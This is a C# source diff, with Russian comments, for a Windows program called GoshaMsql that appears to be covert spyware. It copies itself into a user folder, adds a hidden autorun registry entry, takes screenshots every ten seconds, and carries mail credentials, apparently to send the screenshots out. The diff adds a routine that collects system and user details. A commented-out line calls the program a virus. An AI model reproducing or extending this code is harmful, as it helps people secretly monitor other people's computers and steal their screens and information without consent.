@@ -10,6 +10,8 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.Security.Principal;
+using System.Management;
 
 namespace GoshaMsql
 {
@@ -21,7 +23,7 @@ namespace GoshaMsql
         static string userName = "Клиент"; //имя клиента
         static string logErrors = finalDir+"logErrors.txt"; //имя клиента
         static string initName = @"C:\Users\Dim\Desktop\123\Screens\"; // конечна папка с криншодами;
-        static string wayToDir = @"Skrin\"; //имя подпапки, в которую скидываются скриншоты
+        static string wayToDir = @"Screens\"; //имя подпапки, в которую скидываются скриншоты
         static string finalDir = @"C:\\Users\\Dim\Desktop\\123\\"; //имя директории, в которую переносится программа
         static string nameOfApp = @"GoshaMsql.exe"; //название исполняемого файла
         static string subKeyAdress2 = @"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"; //путь к записи в реестре для добавления в авторан
@@ -40,53 +42,18 @@ namespace GoshaMsql
         static string mailPassword = @"MyPassword"; //пароль от почты отправителя
         static string exp = @".bmp"; //расширение файла
         static int timeBetweenScreens = 10000; //время между снятием двух скриншотов.
-
+        static string wayToScreen; //хранение скринов
         //***********
-       // static string wayToDir = @"Screens\";
-        static string wayToScreen; 
-       // static string finalDir = @"C:\Program Files (x86)\ScreenSaver\";
-      //  Thread Cir = new Thread(Circle);
 
-        public static void FirstStart()
-        {
-            string logg = "ЛОГ ошибок \t\n";
-        
-            try
-            {
-                Directory.CreateDirectory(finalDir); // создаем директорию 
-               // File.Create(logErrors);
-                Directory.CreateDirectory(initName); // создаем директорию для скинов
-                // Directory.CreateDirectory("${finalDir}{wayToDir}"); // создаем полный путь к директорию 
-              //  File.Copy(Application.ExecutablePath, finalDir + nameOfApp); //копироние программы в нужную папку
 
-                string ExePath = finalDir + nameOfApp;  //место к исполняемогу файлу
-                RegistryKey reg;
-               // reg = Registry.CurrentUser.CreateSubKey(subKeyAdress); // создаем ветку в реестре
-               // reg.SetValue(name, ExePath); // имя для регистра и путь к файлу.
-               // reg.Close(); //завершение работы с риеестром
 
-                if (Directory.Exists(initName)) //проверка. Если имя конечной папки существует..ТО копируем ее в конечную папку по пути finalDir
-                {
-                   // File.Copy(initName, finalDir + initName);
-                    File.Copy(nameOfApp, initName);
-                }
-            }
-            catch (Exception e)
-            {
-               
-                logg += $"{DateTime.Now}\t\nПрозошла ошибка при работе {e}\t\n";
-                WrateText(logg);
-
-            }
-
-            Application.Exit(); // выход из программы
-
-        }
 
         public async static void Test()
         {
-            string sourceDir = @"c:\current";
-            string backupDir = @"c:\archives\2008";
+            //Откуда копируем нужные файлы
+            string tempPach = Environment.CurrentDirectory + @"\\MaterialDesignColors.dll";
+            string tempPach2 = Environment.CurrentDirectory + @"\\MaterialSkin.dll";
+           
             try
             {
                 //Проверка на существоании дериктории
@@ -95,14 +62,15 @@ namespace GoshaMsql
                     Directory.CreateDirectory(finalDir); //создание основной
                     Directory.CreateDirectory(finalDir + @"Screens\"); // создание второстипенной
 
-                    File.Copy(Application.ExecutablePath, finalDir + "GoshaMsql.exe"); //копирование  exe файла, в папку
-                    //File.Copy(@"//MaterialDesignColors.dll" , "MaterialDesignColors.dll");// НЯужно скопировать ддл
-                   // File.Copy(Application.ExecutablePath, finalDir + "MaterialSkin.dll");
+                      File.Copy(Application.ExecutablePath, finalDir + "GoshaMsql.exe"); //копирование  exe файла, в папку
+                      File.Copy(tempPach , finalDir + "MaterialDesignColors.dll");
+                      File.Copy(tempPach2 , finalDir + "MaterialSkin.dll");
 
                     const string name = "SoftWare";
                     string ExePath = finalDir + "GoshaMsql.exe"; // путь к загрузчику
                     RegistryKey reg; //обьект для работы с реестром
                     reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"); // регестируем в реест загрузки ехе файл
+
                     try
                     {
                         reg.SetValue(name, ExePath);// запись в реестр
@@ -115,9 +83,10 @@ namespace GoshaMsql
                         //MessageBox.Show("");
                     }
 
-                   // MessageBox.Show("Я мирный хохляций вирус. Пожалуйста, удали 1 какой-нибудь файл на своем компьтере. Ты больше не увидишь это сообщение.");
+                    // MessageBox.Show("Я мирный хохляций вирус. Пожалуйста, удали 1 какой-нибудь файл на своем компьтере. Ты больше не увидишь это сообщение.");
                     ///Process.Start("cmd", @"/C shutdown /r");
-                    Application.Exit();
+                    ShowSystemInfo();
+                    Application.Exit();// Закрытие приложения
                 }
                 else
                 {
@@ -128,7 +97,7 @@ namespace GoshaMsql
                     //очистка старых фоток
                     foreach (string way in Directory.GetFiles(wayToDir))
                     {
-                        File.Delete(way); //удаление
+                       // File.Delete(way); //удаление Пока отключим
                     }
 
                          
@@ -213,9 +182,38 @@ namespace GoshaMsql
         {
             using (StreamWriter sw = new StreamWriter(logErrors, true, System.Text.Encoding.Default))
             {
-                sw.WriteLine(myText); // запись
+                sw.WriteLine(DateTime.Now+"\t\n"+myText); // запись
                
             }
+        }
+
+        //Получение информации о компе.
+        public static void ShowSystemInfo()
+        {
+            string infaOSisteme = "ИНФОРМАЦИЯ О СИСТЕМЕ ";
+            // Имя пользователя, который выполнил вход в систему Windows
+            //infaOSisteme += $"Имя пользователя: " + Environment.UserName;
+            //infaOSisteme += $"Домен имя пользователя: " + WindowsIdentity.GetCurrent().Name;
+
+            infaOSisteme += $"Операционная система (номер версии):"+ Environment.OSVersion+ Environment.NewLine;
+            infaOSisteme += $"Разрядность процессора:"+  Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE")+ Environment.NewLine;
+            infaOSisteme += $"Модель процессора:"+ Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER")+Environment.NewLine;
+            infaOSisteme += $"Путь к системному каталогу:"+ Environment.SystemDirectory+Environment.NewLine;
+            infaOSisteme += $"Число процессоров:  {0}"+ Environment.ProcessorCount+Environment.NewLine;
+            infaOSisteme += $"Имя пользователя: {0}"+ Environment.UserName+Environment.NewLine;
+
+            //// Локальные диски
+            //infaOSisteme += "Локальные диски: \t\n";
+            //foreach (DriveInfo dI in DriveInfo.GetDrives())
+            //{
+            //    infaOSisteme +=
+            //           "\t Диск: {0}\n\t" +
+            //          " Формат диска: {1}\n\t " +
+            //          "Размер диска (ГБ): {2}\n\t Доступное свободное место (ГБ): {3}\n"+
+            //          dI.Name, dI.DriveFormat +(double)dI.TotalSize / 1024 / 1024 / 1024 +(double)dI.AvailableFreeSpace / 1024 / 1024 / 1024;
+            //   // Console.WriteLine();
+            //}
+            WrateText(infaOSisteme);
         }
     }
 }
